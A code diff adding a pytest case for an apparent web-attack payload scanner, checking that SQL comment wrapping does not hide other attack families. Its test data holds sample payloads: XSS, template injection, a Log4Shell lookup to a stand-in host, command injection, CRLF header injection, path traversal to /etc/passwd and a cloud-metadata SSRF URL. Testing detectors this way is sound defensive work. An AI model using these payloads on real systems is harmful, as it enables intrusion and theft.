@@ -222,3 +222,21 @@ def test_family_names_are_valid_disabled_rules():
     assert config.disabled_rules == familias
     with pytest.raises(ValueError):
         Config(disabled_rules={"no-existe"})
+
+
+@pytest.mark.parametrize(
+    ("payload", "familia_esperada"),
+    [
+        ("/*<script>alert(1)</script>*/", "xss"),
+        ("/*{{7*7}}*/", "ssti"),
+        ("/*${jndi:ldap://evil.example/a}*/", "log4shell"),
+        ("/*$(id)*/", "cmdi"),
+        ("/*%0d%0aSet-Cookie: session=evil*/", "crlf"),
+        ("/*../../etc/passwd*/", "path_traversal"),
+        ("/*http://169.254.169.254/latest/meta-data/*/", "ssrf"),
+    ],
+)
+def test_comentario_sql_no_oculta_otras_familias(payload: str, familia_esperada: str) -> None:
+    """Envolver un payload en `/*...*/` no debe ocultar ataques de familias no SQL (IA-1)."""
+    assert scan(payload) == familia_esperada
+
